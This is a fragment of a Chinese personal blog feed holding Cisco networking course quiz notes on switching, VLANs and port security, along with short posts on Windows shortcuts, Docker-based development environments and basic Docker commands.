src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303201755734.png" srcset="/img/loading.gif" class="" title="image-20200303201755734"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200303202527458.png" srcset="/img/loading.gif" class="" title="image-20200303202527458"><p>DNS 53端口 即是UDP也是TCP</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200326091219029.png" srcset="/img/loading.gif" class="" title="image-20200326091219029"><blockquote><p>What happens to a static route entry in a routing table when the outgoing interface is not available?<br><strong>The route is removed from the table.</strong></p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200409112857408.png" srcset="/img/loading.gif" class="" title="image-20200409112857408"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415131256177.png" srcset="/img/loading.gif" class="" title="image-20200415131256177"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415131821432.png" srcset="/img/loading.gif" class="" title="image-20200415131821432"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415131935464.png" srcset="/img/loading.gif" class="" title="image-20200415131935464"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132300377.png" srcset="/img/loading.gif" class="" title="image-20200415132300377"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132637432.png" srcset="/img/loading.gif" class="" title="image-20200415132637432"><p>匹配最长</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132753057.png" srcset="/img/loading.gif" class="" title="image-20200415132753057"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132849136.png" srcset="/img/loading.gif" class="" title="image-20200415132849136"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415132945261.png" srcset="/img/loading.gif" class="" title="image-20200415132945261"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133009739.png" srcset="/img/loading.gif" class="" title="image-20200415133009739"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133124039.png" srcset="/img/loading.gif" class="" title="image-20200415133124039"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133146490.png" srcset="/img/loading.gif" class="" title="image-20200415133146490"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133211622.png" srcset="/img/loading.gif" class="" title="image-20200415133211622"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200415133305998.png" srcset="/img/loading.gif" class="" title="image-20200415133305998"><blockquote><p>模块化交换机通过使用线路卡提供了容错和带宽可用性与将来扩展的功能，但实施成本非常昂贵。堆叠式交换机通过在交换机之间使用特殊电缆提供容错和带宽可用性，并且比模块化交换机的实施成本低。非堆叠式交换机不提供这些功能。固定配置交换机是不支持自带功能以外功能的单个交换机。</p></blockquote><p>交换机分层设计模型有哪三层？</p><blockquote><p>接入层是最低层，它为用户提供网络访问。分布层具有很多功能，但是它聚合接入层的数据，提供过滤、策略控制并设置第 3 层路由边界。核心层提供高速连接。</p></blockquote><blockquote><p>为提高效率、可扩展性和成本效益，建议建立从一个中心站点到所有其他园区站点的扩展星型拓扑。网状拓扑更昂贵，总线和双环拓扑更难进行故障排除和维护。</p></blockquote><p>网络设计师何时会关注 RU？</p><p>何时考虑端口密度<br>何时计算最大端口速度<br>何时确定可用的线卡数量<br>何时购买用于网络机架的特定数量的交换机</p><blockquote><p>机架单元或 RU 是与交换机高度相关的一项特定测量。1 RU 交换机的额定值小于 2 RU 交换机的额定值。端口密度测量交换机上的端口数。模块化影响可用线卡的数量。端口速度测量可流过给定端口的每秒比特数。</p><p>正确答案是：何时购买用于网络机架的特定数量的交换机</p></blockquote><p>融合网络中的自动话务员功能提供什么服务？</p><p>点对点视频<br>呼叫路由<br>IT 管理接口<br>视频会议</p><blockquote><p>自动话务员功能通过将呼叫直接路由到个人或部门，从而加快语音服务的速度。点对点视频和视频会议说明了融合网络中的视频服务。IT 管理接口是融合网络解决方案的一部分，能够让 IT 人员通过统一应用执行移动、添加和更改等操作。</p></blockquote><p>正确答案是：呼叫路由</p><p>哪两个特征描述了融合网络？（请选择两项。）</p><p>降低了服务呼叫<br>使用相同的交换机支持语音和视频<br>语音和视频流量的单独布线基础设施<br>中小型企业的可负担性<br>更低的设备成本</p><blockquote><p>融合网络具有传统的用户流量以及数字化语音和视频流量，这些流量以前需要单独的网络。现在，不再是单独的组管理单独的网络，一组人员即可管理网络。</p></blockquote><p>正确答案是：使用相同的交换机支持语音和视频, 中小型企业的可负担性</p><h3 id="What-type-of-network-uses-one-common-infrastructure-to-carry-voice-data-and-video-signals"><a href="#What-type-of-network-uses-one-common-infrastructure-to-carry-voice-data-and-video-signals" class="headerlink" title="What type of network uses one common infrastructure to carry voice, data, and video signals?"></a>What type of network uses one common infrastructure to carry voice, data, and video signals?</h3><ul><li><p>switched</p></li><li><p>borderless</p></li><li><p>converged</p></li><li><p>managed</p><blockquote><p><strong>Explanation:</strong>A converged network has only one physical network to install and manage. This results in substantial savings over the installation and management of separate voice, video, and data networks.</p></blockquote></li></ul><h3 id="Which-solution-would-help-a-college-alleviate-network-congestion-due-to-collisions"><a href="#Which-solution-would-help-a-college-alleviate-network-congestion-due-to-collisions" class="headerlink" title="Which solution would help a college alleviate network congestion due to collisions?"></a>Which solution would help a college alleviate network congestion due to collisions?</h3><ul><li><p>a firewall that connects to two Internet providers</p></li><li><p>a high port density switch</p></li><li><p>a router with two Ethernet ports</p></li><li><p>a router with three Ethernet ports</p><blockquote><p><strong>Explanation:</strong>Switches provide microsegmentation so that one device does not compete for the same Ethernet network bandwidth with another network device, thus practically eliminating collisions. A high port density switch provides very fast connectivity for many devices.</p></blockquote></li></ul><p>alleviate：减轻</p><p>congestion：拥塞</p><p>collisions：碰撞</p><h3 id="What-is-a-basic-function-of-the-Cisco-Borderless-Architecture-distribution-layer"><a href="#What-is-a-basic-function-of-the-Cisco-Borderless-Architecture-distribution-layer" class="headerlink" title="What is a basic function of the Cisco Borderless Architecture distribution layer?"></a>What is a basic function of the Cisco Borderless Architecture distribution layer?</h3><ul><li><p>acting as a backbone</p></li><li><p>aggregating all the campus blocks</p></li><li><p>aggregating Layer 3 routing boundaries</p></li><li><p>providing access to end user devices</p><blockquote><p><strong>Explanation:</strong>One of the basic functions of the distribution layer of the Cisco Borderless Architecture is to perform routing between different VLANs. Acting as a backbone and aggregating campus blocks are functions of the core layer. Providing access to end user devices is a function of the access layer.</p></blockquote></li></ul><h3 id="A-network-designer-must-provide-a-rationale-to-a-customer-for-a-design-which-will-move-an-enterprise-from-a-flat-network-topology-to-a-hierarchical-network-topology-Which-two-features-of-the-hierarchical-design-make-it-the-better-choice-Choose-two"><a href="#A-network-designer-must-provide-a-rationale-to-a-customer-for-a-design-which-will-move-an-enterprise-from-a-flat-network-topology-to-a-hierarchical-network-topology-Which-two-features-of-the-hierarchical-design-make-it-the-better-choice-Choose-two" class="headerlink" title="A network designer must provide a rationale to a customer for a design which will move an enterprise from a flat network topology to a hierarchical network topology. Which two features of the hierarchical design make it the better choice? (Choose two.)"></a>A network designer must provide a rationale to a customer for a design which will move an enterprise from a flat network topology to a hierarchical network topology. Which two features of the hierarchical design make it the better choice? (Choose two.)</h3><ul><li><p>lower bandwidth requirements</p></li><li><p>reduced cost for equipment and user training</p></li><li><p>easier to provide redundant links to ensure higher availability</p></li><li><p>less required equipment to provide the same performance levels</p></li><li><p>simpler deployment for additional switch equipment</p><blockquote><p><strong>Explanation:</strong>A hierarchical design for switches helps network administrators when planning and deploying a network expansion, performing fault isolation when a problem occurs, and providing resiliency when traffic levels are high. A good hierarchical design has redundancy when it can be afforded so that one switch does not cause all networks to be down.</p></blockquote></li></ul><h3 id="What-does-the-term-“port-density”-represent-for-an-Ethernet-switch"><a href="#What-does-the-term-“port-density”-represent-for-an-Ethernet-switch" class="headerlink" title="What does the term “port density” represent for an Ethernet switch?"></a>What does the term “port density” represent for an Ethernet switch?</h3><ul><li><p>the memory space that is allocated to each switch port</p></li><li><p>the number of available ports</p></li><li><p>the numbers of hosts that are connected to each switch port</p></li><li><p>the speed of each port</p><blockquote><p><strong>Explanation:</strong>The term port density represents the number of ports available in a switch. A one rack unit access switch can have up to 48 ports. Larger switches may support hundreds of ports.</p></blockquote></li></ul><h3 id="What-is-a-definition-of-a-two-tier-LAN-network-design"><a href="#What-is-a-definition-of-a-two-tier-LAN-network-design" class="headerlink" title="What is a definition of a two-tier LAN network design?"></a>What is a definition of a two-tier LAN network design?</h3><ul><li><p>access and core layers collapsed into one tier, and the distribution layer on a separate tier</p></li><li><p>access and distribution layers collapsed into one tier, and the core layer on a separate tier</p></li><li><p>distribution and core layers collapsed into one tier, and the access layer on a separate tier</p></li><li><p>access, distribution, and core layers collapsed into one tier, with a separate backbone layer</p><blockquote><p><strong>Explanation:</strong>Maintaining three separate network tiers is not always required or cost-efficient. All network designs require an access layer, but a two-tier design can collapse the distribution and core layers into one layer to serve the needs of a small location with few users.</p></blockquote></li></ul><h3 id="What-are-two-reasons-a-network-administrator-would-segment-a-network-with-a-Layer-2-switch-Choose-two"><a href="#What-are-two-reasons-a-network-administrator-would-segment-a-network-with-a-Layer-2-switch-Choose-two" class="headerlink" title="What are two reasons a network administrator would segment a network with a Layer 2 switch? (Choose two.)"></a>What are two reasons a network administrator would segment a network with a Layer 2 switch? (Choose two.)</h3><ul><li><p>to create fewer collision domains</p></li><li><p>to enhance user bandwidth</p></li><li><p>to create more broadcast domains</p></li><li><p>to eliminate virtual circuits</p></li><li><p>to isolate traffic between segments</p></li><li><p>to isolate ARP request messages from the rest of the network</p><blockquote><p><strong>Explanation:</strong>A switch has the ability of creating temporary point-to-point connections between the directly-attached transmitting and receiving network devices. The two devices have full-bandwidth full-duplex connectivity during the transmission.</p></blockquote></li></ul><blockquote><p>A collapsed core design is appropriate for a small, single building business. This type of design uses two layers (the collapsed core and distribution layers consolidated into one layer and the access layer). Larger businesses use the traditional three-tier switch design model</p></blockquote><h3 id="Which-statement-describes-a-result-after-multiple-Cisco-LAN-switches-are-interconnected"><a href="#Which-statement-describes-a-result-after-multiple-Cisco-LAN-switches-are-interconnected" class="headerlink" title="Which statement describes a result after multiple Cisco LAN switches are interconnected?"></a>Which statement describes a result after multiple Cisco LAN switches are interconnected?</h3><ul><li><p>The broadcast domain expands to all switches.</p></li><li><p>One collision domain exists per switch.</p></li><li><p>Frame collisions increase on the segments connecting the switches.</p></li><li><p>There is one broadcast domain and one collision domain per switch.</p><blockquote><p><strong>Explanation:</strong>In Cisco LAN switches, the microsegmentation makes it possible for each port to represent a separate segment and thus each switch port represents a separate collision domain. This fact will not change when multiple switches are interconnected. However, LAN switches do not filter broadcast frames. A broadcast frame is flooded to all ports. Interconnected switches form one big broadcast domain.</p></blockquote></li></ul><h3 id="What-are-two-advantages-of-modular-switches-over-fixed-configuration-switches-Choose-two"><a href="#What-are-two-advantages-of-modular-switches-over-fixed-configuration-switches-Choose-two" class="headerlink" title="What are two advantages of modular switches over fixed-configuration switches? (Choose two.)"></a>What are two advantages of modular switches over fixed-configuration switches? (Choose two.)</h3><ul><li><p>lower cost per switch</p></li><li><p>increased scalability</p></li><li><p>lower forwarding rates</p></li><li><p>need for fewer power outlets</p></li><li><p>availability of multiple ports for bandwidth aggregation</p><blockquote><p><strong>Explanation:</strong>Fixed-configuration switches, although lower in price, have a designated number of ports and no ability to add ports. They also typically provide fewer high-speed ports. In order to scale switching on a network that consists of fixed-configuration switches, more switches need to be purchased. This increases the number of power outlets that need to be used. Modular switches can be scaled simply by purchasing additional line cards. Bandwidth aggregation is also easier, because the backplane of the chassis can provide the bandwidth that is needed for the switch port line cards.</p></blockquote></li></ul><h3 id="What-two-criteria-are-used-by-a-Cisco-LAN-switch-to-decide-how-to-forward-Ethernet-frames-Choose-two"><a href="#What-two-criteria-are-used-by-a-Cisco-LAN-switch-to-decide-how-to-forward-Ethernet-frames-Choose-two" class="headerlink" title="What two criteria are used by a Cisco LAN switch to decide how to forward Ethernet frames? (Choose two.)"></a>What two criteria are used by a Cisco LAN switch to decide how to forward Ethernet frames? (Choose two.)</h3><ul><li><p>path cost</p></li><li><p>egress port</p></li><li><p>ingress port</p></li><li><p>destination IP address</p></li><li><p>destination MAC address</p><blockquote><p><strong>Explanation:</strong>Cisco LAN switches use the MAC address table to make decisions of traffic forwarding. The decisions are based on the ingress port and the destination MAC address of the frame. The ingress port information is important because it carries the VLAN to which the port belongs.</p></blockquote></li></ul><h3 id="What-is-one-function-of-a-Layer-2-switch"><a href="#What-is-one-function-of-a-Layer-2-switch" class="headerlink" title="What is one function of a Layer 2 switch?"></a>What is one function of a Layer 2 switch?</h3><ul><li><p>forwards data based on logical addressing</p></li><li><p>duplicates the electrical signal of each frame to every port</p></li><li><p>learns the port assigned to a host by examining the destination MAC address</p></li><li><p>determines which interface is used to forward a frame based on the destination MAC address</p><blockquote><p><strong>Explanation:</strong>A switch builds a MAC address table of MAC addresses and associated port numbers by examining the source MAC address found in inbound frames. To forward a frame onward, the switch examines the destination MAC address, looks in the MAC address for a port number associated with that destination MAC address, and sends it to the specific port. If the destination MAC address is not in the table, the switch forwards the frame out all ports except the inbound port that originated the frame.</p></blockquote></li></ul><h3 id="Which-network-device-can-be-used-to-eliminate-collisions-on-an-Ethernet-network"><a href="#Which-network-device-can-be-used-to-eliminate-collisions-on-an-Ethernet-network" class="headerlink" title="Which network device can be used to eliminate collisions on an Ethernet network?"></a>Which network device can be used to eliminate collisions on an Ethernet network?</h3><ul><li><p>firewall</p></li><li><p>hub</p></li><li><p>router</p></li><li><p>switch</p><blockquote><p><strong>Explanation:</strong>A switch provides microsegmentation so that no other device competes for the same Ethernet network bandwidth.</p></blockquote></li></ul><h3 id="What-is-the-destination-address-in-the-header-of-a-broadcast-frame"><a href="#What-is-the-destination-address-in-the-header-of-a-broadcast-frame" class="headerlink" title="What is the destination address in the header of a broadcast frame?"></a>What is the destination address in the header of a broadcast frame?</h3><p>FF-FF-FF-FF-FF-FF</p><blockquote><p>A converged network provides a single infrastructure that combines voice, video, and data. Analog phones, user data, and point-to-point video traffic are all contained within the single network infrastructure of a converged network.</p></blockquote><p>打开交换机时，启动顺序中的第一个操作是什么？</p><p>A. 加载默认 Cisco IOS 软件</p><p>B. 加载启动加载器软件</p><p>C. 低级 CPU 初始化</p><p>D. 加载加电自检程序</p><blockquote><p><strong>答案</strong></p><p>D. 交换机启动后的第一个操作是 POST（加电自检）。POST 对 CPU、内存和闪存进行测试，以准备加载启动加载器。</p></blockquote><p>网络管理员配置了 VLAN 99 作为管理 VLAN，并为其配置 IP 地址和子网掩码。管理员发出 show interface vlan 99 命令并注意到线路协议处于关闭状态。以下哪项操作可以将线路协议的状态更改为开启？</p><p>A. 将主机连接到与 VLAN 99 相关联的接口</p><p>B. 配置默认网关</p><p>C. 从 VLAN 99 中删除所有接入端口</p><p>D. 在 vty 线路上配置传输输入法</p><blockquote><p><strong>答案</strong></p><p>A. 一旦 SVI 配置了 IP 地址和子网掩码，即可用于远程管理。当 SVI VLAN 有一个活动端口与之关联时，SVI 接口处于活动状态。</p></blockquote><p>攻击者已经绕过物理安全并且可以将笔记本电脑连接到交换机上的以太网接口。如果所有交换机端口都配置了端口安全，并且违规模式设置为出厂默认设置，则针对攻击者采取哪项操作？</p><p>A. 具有未知源地址的数据包被丢弃，并且没有已发生安全违规的通知。。</p><p>B. 具有未知源地址的数据包被丢弃，并且有已发生安全违规的通知。</p><p>C. 具有未知源地址的数据包被丢弃，并且接口进入错误禁用状态并关闭端口 LED。</p><p>D. 具有未知源地址的数据包被转发，并且会向 syslog 服务器发送通知。</p><blockquote><p><strong>答案</strong></p><p>C. 默认违规模式已关闭。在此模式下，端口安全违规将造成接口立即变为错误禁用 (error-disabled) 状态，并关闭端口 LED。该模式还会发送 SNMP 陷阱、将 syslog 消息记入日志，以及逐渐增加违规计数器的计数。</p></blockquote><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/download.png" srcset="/img/loading.gif" class="" title="i291241n1v4.png"><p>似乎是交换机的默认配置。</p><p>使用交换机时，造成不完全以太网帧的潜在原因是什么？</p><p>A. 双工配置错误</p><p>B. 线缆过长</p><p>C. 延迟冲突</p><p>D. NIC 故障</p><blockquote><p><strong>答案</strong></p><p>D. 不完全帧即小于 64 字节的帧，所允许的最小值是以太帧。该类型帧通常是由于 NIC 故障或过度冲突。两端配置错误可能导致连接问题。线缆过长可能产生 CRC 错误和/或延迟冲突。</p></blockquote><p><strong>端口速度 LED</strong> - 表示选择了端口速度模式。 选择后，端口 LED 将显示不同含义的颜色。 如果 LED 不亮，则端口运行速度为 10 Mb/s。 如果 LED 为绿色，则端口运行速度为 100 Mb/s。 如果 LED 为绿色闪烁，则端口运行速度为 1000 Mb/s。</p><p>下列哪项操作可以将错误禁用交换机端口返回至运行状态？</p><p>A. 在接口上删除并重新配置端口安全</p><p>B. 在接口上发出 switchport mode access 命令</p><p>C. 清除交换机上的 MAC 地址表</p><p>D. 发出 shutdown 和 no shutdown 接口命令</p><p><strong>答案</strong></p><p>Option 4. 当配置了端口安全的交换机端口出现违规时会将违规操作关闭，端口将置为 err-disabled 状态。可以通过关闭接口然后发出 no shutdown 命令重新启用接口。</p><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519101713958.png" srcset="/img/loading.gif" class="" title="image-20200519101713958"><img src="/2020/03/31/cisco%E8%AF%BE%E7%A8%8B%E4%BB%A3%E7%A0%81%E8%AE%B0%E5%BD%95/image-20200519102510122.png" srcset="/img/loading.gif" class="" title="image-20200519102510122"><p>交换机引导加载程序的功能是什么？</p><p>A. 加快引导过程</p><p>B. 提供交换机启动时的脆弱状态安全</p><p>C. 控制启动过程中交换机的可用 RAM 量</p><p>D. 提供无法找到交换机操作系统时的操作环境</p><blockquote><p><strong>答案</strong></p><p>Option 4 在交换机找不到有效操作系统时，显示交换机启动加载程序环境。启动加载程序环境提供一些基本命令来允许网络管理员重新加载操作系统或者提供操作系统的备选位置。</p></blockquote><p>哪一命令用于设置定义交换机上 IOS 映像查找位置的 BOOT 环境变量？</p><ul><li><strong>boot system</strong></li></ul><p>哪个接口是包含用于管理 24 个端口以太网交换机的 IP 地址的默认位置？</p><ul><li>VLAN 1</li></ul>]]></content>
    
    
    <categories>
      
      <category>专业学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>专业学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常用好用的快捷键（Win）</title>
    <link href="/2020/03/25/%E5%B8%B8%E7%94%A8%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE%EF%BC%88Win%EF%BC%89/"/>
    <url>/2020/03/25/%E5%B8%B8%E7%94%A8%E5%A5%BD%E7%94%A8%E7%9A%84%E5%BF%AB%E6%8D%B7%E9%94%AE%EF%BC%88Win%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="常用好用的快捷键（Win）"><a href="#常用好用的快捷键（Win）" class="headerlink" title="常用好用的快捷键（Win）"></a>常用好用的快捷键（Win）</h1><p><strong>写下来新发现的/有需求之后找到的快捷键，希望对各位有帮助</strong></p><h2 id="全局（存疑）"><a href="#全局（存疑）" class="headerlink" title="全局（存疑）"></a>全局（存疑）</h2><h3 id="软件窗口切换"><a href="#软件窗口切换" class="headerlink" title="软件窗口切换"></a>软件窗口切换</h3><p>自由控制方向<code>alt + 方向</code></p><p>依次切换<code>alt + tab</code></p><h3 id="选择已输入的"><a href="#选择已输入的" class="headerlink" title="选择已输入的"></a>选择已输入的</h3><p><code>shift + ←/→方向键</code></p><h2 id="游览器"><a href="#游览器" class="headerlink" title="游览器"></a>游览器</h2><h3 id="恢复关闭的页面-隐私模式下无用"><a href="#恢复关闭的页面-隐私模式下无用" class="headerlink" title="恢复关闭的页面(隐私模式下无用)"></a>恢复关闭的页面(隐私模式下无用)</h3><p><code>ctrl + shift + t</code></p><h3 id="页面切换"><a href="#页面切换" class="headerlink" title="页面切换"></a>页面切换</h3><p>顺序切换<code>ctrl + tab</code></p><p>倒叙<code>ctrl + shift + tab</code></p><h3 id="关闭当前页面"><a href="#关闭当前页面" class="headerlink" title="关闭当前页面"></a>关闭当前页面</h3><p><code>ctrl + w</code></p><h2 id="Vs-code"><a href="#Vs-code" class="headerlink" title="Vs code"></a>Vs code</h2><p>点在函数，变量名上 按 F2 一键同名全部改名</p><p>随时可能更新qwq</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker隔离开发环境和宿主</title>
    <link href="/2020/03/18/docker%E9%9A%94%E7%A6%BB%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%92%8C%E5%AE%BF%E4%B8%BB/"/>
    <url>/2020/03/18/docker%E9%9A%94%E7%A6%BB%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E5%92%8C%E5%AE%BF%E4%B8%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="docker隔离开发环境和宿主"><a href="#docker隔离开发环境和宿主" class="headerlink" title="docker隔离开发环境和宿主"></a>docker隔离开发环境和宿主</h1><p>如何把开发环境移到docker里？</p><p>目前设想了有：通过scp传数据，来让宿主机知道docker里安装了啥包。然后对应自动生成dockerfile。通过vscode remote。</p><p>基础镜像，是一开始自己也不知道需要什么包的,所以直接装在镜像里,然后通过python来检测docker里安装了啥东西，再传出来到宿主机补充到dockerfile/自动安装包脚本里。至于开发的文件，git和云同步都挺好。真正做到开发完就丢环境                                 </p><p>补充调查：</p><ul><li><p>docker镜像可以拷贝到u盘上。<a href="https://blog.csdn.net/nimei31/article/details/80716573" target="_blank" rel="noopener">link</a></p></li><li><p>vscode remote 远程开发 <a href="https://www.cnblogs.com/tinywan/p/11107397.html" target="_blank" rel="noopener">link</a> 主机安装ssh-server，本地安装ssh-client，vscode安装remote development</p></li><li><p><a href="https://www.cnblogs.com/mengw/p/11413461.html" target="_blank" rel="noopener">https://www.cnblogs.com/mengw/p/11413461.html</a>)</p></li></ul><h2 id="本机"><a href="#本机" class="headerlink" title="本机"></a>本机</h2><ul><li><p><a href="https://github.com/Microsoft/vscode-remote-try-python" target="_blank" rel="noopener">下载</a></p></li><li><p><a href="https://code.visualstudio.com/docs/remote/containers#_getting-started" target="_blank" rel="noopener">跟随</a></p></li></ul><p>然后等待下载完就可以了</p><h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><p><a href="https://code.visualstudio.com/docs/remote/containers-advanced#_developing-inside-a-container-on-a-remote-docker-host" target="_blank" rel="noopener">https://code.visualstudio.com/docs/remote/containers-advanced#_developing-inside-a-container-on-a-remote-docker-host</a></p><p>项目搬迁的时候，需要把当前的环境依赖包导出，然后到部署项目的服务器上安装依赖。 我们可以通过下面的命令执行，把依赖包导出到requirements.txt文件里。 生成requirements.txt</p><pre><code>pip freeze &gt; requirements.txt</code></pre><p>安装requirements.txt依赖</p><pre><code>pip install -r requirements.txt</code></pre><p><a href="https://www.django.cn/forum/forum-10.html" target="_blank" rel="noopener">原文</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>docker</title>
    <link href="/2020/03/16/docker/"/>
    <url>/2020/03/16/docker/</url>
    
    <content type="html"><![CDATA[<h1 id="docker记录"><a href="#docker记录" class="headerlink" title="docker记录"></a>docker记录</h1><h2 id="群里介绍截图"><a href="#群里介绍截图" class="headerlink" title="群里介绍截图"></a>群里介绍截图</h2><img src="/2020/03/16/docker/image-20200309201430966.png" srcset="/img/loading.gif" class="" title="image-20200309201430966"><img src="/2020/03/16/docker/image-20200309201729975.png" srcset="/img/loading.gif" class="" title="image-20200309201729975"><img src="/2020/03/16/docker/image-20200309202211814.png" srcset="/img/loading.gif" class="" title="image-20200309202211814"><img src="/2020/03/16/docker/image-20200309202523127.png" srcset="/img/loading.gif" class="" title="image-20200309202523127"><img src="/2020/03/16/docker/image-20200309202550963.png" srcset="/img/loading.gif" class="" title="image-20200309202550963"><img src="/2020/03/16/docker/image-20200309203036752.png" srcset="/img/loading.gif" class="" title="image-20200309203036752"><img src="/2020/03/16/docker/image-20200309203235771.png" srcset="/img/loading.gif" class="" title="image-20200309203235771"><p>2375:默认端口</p><img src="/2020/03/16/docker/image-20200309203741638.png" srcset="/img/loading.gif" class="" title="image-20200309203741638"><p>不过root权限免密登录的是容器</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>进入<code>docker exec -it ID /bin/bash</code></p><p>查看一下本地的镜像，运行<code>docker images</code></p><p>docker中删除images的命令是<code>docker rmi</code>(此时要求那个没有container在运行才会正确删除)</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?</p><p>我的做法是卸载重装= =</p><p><a href="https://docs.docker.com/install/linux/docker-ce/ubuntu/#uninstall-docker-ce" target="_blank" rel="noopener">安装</a></p><p><a href="https://blog.csdn.net/wireless911/article/details/88989620" target="_blank" rel="noopener">Unable to find image ‘hello-world:latest’ locally）</a></p><img src="/2020/03/16/docker/image-20200316015938550.png" srcset="/img/loading.gif" class="" title="image-20200316015938550">]]></content>
    
    
    <categories>
      
      <category>技术学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>技术学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>商业计划书撰写及案例分析</title>
    <link href="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/"/>
    <url>/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="商业计划书撰写及案例分析"><a href="#商业计划书撰写及案例分析" class="headerlink" title="商业计划书撰写及案例分析"></a>商业计划书撰写及案例分析</h1><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154014932.png" srcset="/img/loading.gif" class="" title="image-20200303154014932"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154629436.png" srcset="/img/loading.gif" class="" title="image-20200303154629436"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303154857510.png" srcset="/img/loading.gif" class="" title="image-20200303154857510"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155013709.png" srcset="/img/loading.gif" class="" title="image-20200303155013709"><p>1，2页，最多3</p><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155045603.png" srcset="/img/loading.gif" class="" title="image-20200303155045603"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155143295.png" srcset="/img/loading.gif" class="" title="image-20200303155143295"><img src="/2020/03/06/%E5%95%86%E4%B8%9A%E8%AE%A1%E5%88%92%E4%B9%A6%E6%92%B0%E5%86%99%E5%8F%8A%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/image-20200303155249332.png" srcset="/img/loading.gif" class="" title="image-20200303155249332"><img 